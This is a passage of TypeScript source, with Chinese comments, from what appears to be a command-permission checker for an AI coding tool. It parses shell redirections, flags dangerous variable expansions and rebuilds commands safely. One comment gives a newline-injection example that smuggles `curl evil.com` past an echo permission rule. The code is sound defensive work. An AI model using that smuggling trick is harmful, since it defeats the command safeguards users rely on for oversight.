        return { skip: 2, dangerous: false }
      }
      // 检查目标中的危险展开（>>& $VAR 或 >>& %VAR%）
      if (hasDangerousExpansion(nextNext)) {
        return { skip: 0, dangerous: true }
      }
    }

    // 标准 stdout 重定向
    if (isSimpleTarget(next)) {
      redirections.push({ target: next, operator })
      return { skip: 1, dangerous: false }
    }

    // 找到重定向运算符但目标含危险展开（> $VAR 或 > %VAR%）
    if (hasDangerousExpansion(next)) {
      return { skip: 0, dangerous: true }
    }
  }

  // 处理 >& 运算符
  if (isOperator(part, '>&')) {
    // 文件描述符重定向（2>&1）——原样保留
    if (isFileDescriptor(prev) && isFileDescriptor(next)) {
      return { skip: 0, dangerous: false } // 重建时处理
    }

    // >&| POSIX 对合并 stdout/stderr 的强制覆盖
    if (isOperator(next, '|') && isSimpleTarget(nextNext)) {
      redirections.push({ target: nextNext as string, operator: '>' })
      return { skip: 2, dangerous: false }
    }
    // >&| 带危险展开目标
    if (isOperator(next, '|') && hasDangerousExpansion(nextNext)) {
      return { skip: 0, dangerous: true }
    }

    // >&! ZSH 对合并 stdout/stderr 的强制覆盖
    if (next === '!' && isSimpleTarget(nextNext)) {
      redirections.push({ target: nextNext as string, operator: '>' })
      return { skip: 2, dangerous: false }
    }
    // >&! 带危险展开目标
    if (next === '!' && hasDangerousExpansion(nextNext)) {
      return { skip: 0, dangerous: true }
    }

    // 重定向 stdout 与 stderr 到文件
    if (isSimpleTarget(next) && !isFileDescriptor(next)) {
      redirections.push({ target: next, operator: '>' })
      return { skip: 1, dangerous: false }
    }

    // 找到重定向运算符但目标含危险展开（>& $VAR 或 >& %VAR%）
    if (!isFileDescriptor(next) && hasDangerousExpansion(next)) {
      return { skip: 0, dangerous: true }
    }
  }

  return { skip: 0, dangerous: false }
}

function handleFileDescriptorRedirection(
  fd: string,
  operator: '>' | '>>',
  target: ParseEntry | undefined,
  redirections: Array<{ target: string; operator: '>' | '>>' }>,
  kept: ParseEntry[],
  skipCount = 1,
): { skip: number; dangerous: boolean } {
  const isStdout = fd === '1'
  const isFileTarget =
    target &&
    isSimpleTarget(target) &&
    typeof target === 'string' &&
    !/^\d+$/.test(target)
  const isFdTarget = typeof target === 'string' && /^\d+$/.test(target.trim())

  // 总是从 kept 移除 fd 数字
  if (kept.length > 0) kept.pop()

  // 安全：在任何提前返回之前先检查危险展开
  // 捕获 2>$HOME/file 或 2>%TEMP%/file 这类情况
  if (!isFdTarget && hasDangerousExpansion(target)) {
    return { skip: 0, dangerous: true }
  }

  // 处理文件重定向（如 2>/tmp/file 的简单目标）
  if (isFileTarget) {
    redirections.push({ target: target as string, operator })

    // 非 stdout：在命令中保留重定向
    if (!isStdout) {
      kept.push(fd + operator, target as string)
    }
    return { skip: skipCount, dangerous: false }
  }

  // 处理 fd 到 fd 的重定向（如 2>&1）
  // 仅对非 stdout 保留
  if (!isStdout) {
    kept.push(fd + operator)
    if (target) {
      kept.push(target)
      return { skip: 1, dangerous: false }
    }
  }

  return { skip: 0, dangerous: false }
}

// 辅助：检查 '(' 是否属于命令替换
function detectCommandSubstitution(
  prev: ParseEntry | undefined,
  kept: ParseEntry[],
  index: number,
): boolean {
  if (!prev || typeof prev !== 'string') return false
  if (prev === '$') return true // 独立的 $

  if (prev.endsWith('$')) {
    // 检查变量赋值模式（如 result=$）
    if (prev.includes('=') && prev.endsWith('=$')) {
      return true // 带命令替换的变量赋值
    }

    // 查找闭合 ) 之后紧邻的文本
    let depth = 1
    for (let j = index + 1; j < kept.length && depth > 0; j++) {
      if (isOperator(kept[j], '(')) depth++
      if (isOperator(kept[j], ')') && --depth === 0) {
        const after = kept[j + 1]
        return !!(after && typeof after === 'string' && !after.startsWith(' '))
      }
    }
  }
  return false
}

// 辅助：检查字符串是否需要引号
function needsQuoting(str: string): boolean {
  // 不引文件描述符重定向（如 '2>', '2>>', '1>' 等）
  if (/^\d+>>?$/.test(str)) return false

  // 引用含任何空白（空格、制表符、换行、CR 等）的字符串。
  // 安全：必须匹配正则 `\s` 类匹配的所有字符。
  // 旧实现只检查空格/制表符；下游消费者如 ENV_VAR_PATTERN 用 `\s+`。
  // 若 reconstructCommand 发出不带引号的 `\n` 或 `\r`，stripSafeWrappers
  // 会跨它匹配，从 `TZ=UTC\necho curl evil.com` 剥离 `TZ=UTC`——匹配
  // Bash(echo:*) 而 bash 按换行分词并运行 `curl`。
  if (/\s/.test(str)) return true

  // 单字符 shell 运算符需引号避免歧义
  if (str.length === 1 && '><|&;()'.includes(str)) return true

  return false
}

// 辅助：带适当间距添加 token
function addToken(result: string, token: string, noSpace = false): string {
  if (!result || noSpace) return result + token
  return result + ' ' + token
}

function reconstructCommand(kept: ParseEntry[], originalCmd: string): string {
  if (!kept.length) return originalCmd

  let result = ''
  let cmdSubDepth = 0
  let inProcessSub = false

  for (let i = 0; i < kept.length; i++) {
    const part = kept[i]
    const prev = kept[i - 1]
    const next = kept[i + 1]

    // 处理字符串
    if (typeof part === 'string') {
      // 含命令分隔符（|&;）的字符串用双引号使其无歧义
      // 其他字符串（含空格等）用 shell-quote 的 quote() 正确转义
      const hasCommandSeparator = /[|&;]/.test(part)
      const str = hasCommandSeparator
        ? `"${part}"`
        : needsQuoting(part)
          ? quote([part])
          : part

      // 检查该字符串是否以 $ 结尾且下一个是 (
      const endsWithDollar = str.endsWith('$')
      const nextIsParen =
        next && typeof next === 'object' && 'op' in next && next.op === '('

      // 特殊间距规则
      const noSpace =
        result.endsWith('(') || // 开括号之后
        prev === '$' || // 独立 $ 之后
        (typeof prev === 'object' && prev && 'op' in prev && prev.op === ')') // 闭括号之后

      // 特例：<( 之后加空格
      if (result.endsWith('<(')) {
        result += ' ' + str
      } else {
        result = addToken(result, str, noSpace)
      }

      // 若字符串以 $ 结尾且下一个是 (，其后不加空格
      if (endsWithDollar && nextIsParen) {
        // 标记下一个 ( 之前不应加空格
      }
      continue
    }

    // 处理运算符
    if (typeof part !== 'object' || !part || !('op' in part)) continue
    const op = part.op as string

    // 处理 glob 模式
    if (op === 'glob' && 'pattern' in part) {
      result = addToken(result, part.pattern as string)
      continue
    }

    // 处理文件描述符重定向（2>&1）
    if (
      op === '>&' &&
      typeof prev === 'string' &&
      /^\d+$/.test(prev) &&
      typeof next === 'string' &&
      /^\d+$/.test(next)
    ) {
      // 移除前一个数字与前面任何空格
      const lastIndex = result.lastIndexOf(prev)
      result = result.slice(0, lastIndex) + prev + op + next
      i++ // 跳过 next
      continue
    }

    // 处理 heredoc
    if (op === '<' && isOperator(next, '<')) {
      const delimiter = kept[i + 2]
      if (delimiter && typeof delimiter === 'string') {
        result = addToken(result, delimiter)
        i += 2 // 跳过 << 与定界符
        continue
      }
    }

    // 处理 here-string（总是保留运算符）
    if (op === '<<<') {
      result = addToken(result, op)
      continue
    }

    // 处理括号
    if (op === '(') {
      const isCmdSub = detectCommandSubstitution(prev, kept, i)

      if (isCmdSub || cmdSubDepth > 0) {
        cmdSubDepth++
        // 命令替换不加空格
        if (result.endsWith(' ')) {
          result = result.slice(0, -1) // 移除尾部空格（若有）
        }
        result += '('
      } else if (result.endsWith('$')) {
        // 处理 result=$ 且 $ 结束字符串的情况
        // 检查是否应为命令替换
        if (detectCommandSubstitution(prev, kept, i)) {
          cmdSubDepth++
          result += '('
        } else {
          // 非命令替换，加空格
          result = addToken(result, '(')
        }
      } else {
        // 只在 <( 或嵌套 ( 之后跳过空格
        const noSpace = result.endsWith('<(') || result.endsWith('(')
        result = addToken(result, '(', noSpace)
      }
      continue
    }

    if (op === ')') {
      if (inProcessSub) {
        inProcessSub = false
        result += ')' // 为进程替换添加闭括号
        continue
      }

      if (cmdSubDepth > 0) cmdSubDepth--
      result += ')' // ) 前不加空格
      continue
    }

    // 处理进程替换
    if (op === '<(') {
      inProcessSub = true
      result = addToken(result, op)
      continue
    }

    // 所有其他运算符
    if (['&&', '||', '|', ';', '>', '>>', '<'].includes(op)) {
      result = addToken(result, op)
    }
  }

  return result.trim() || originalCmd
}
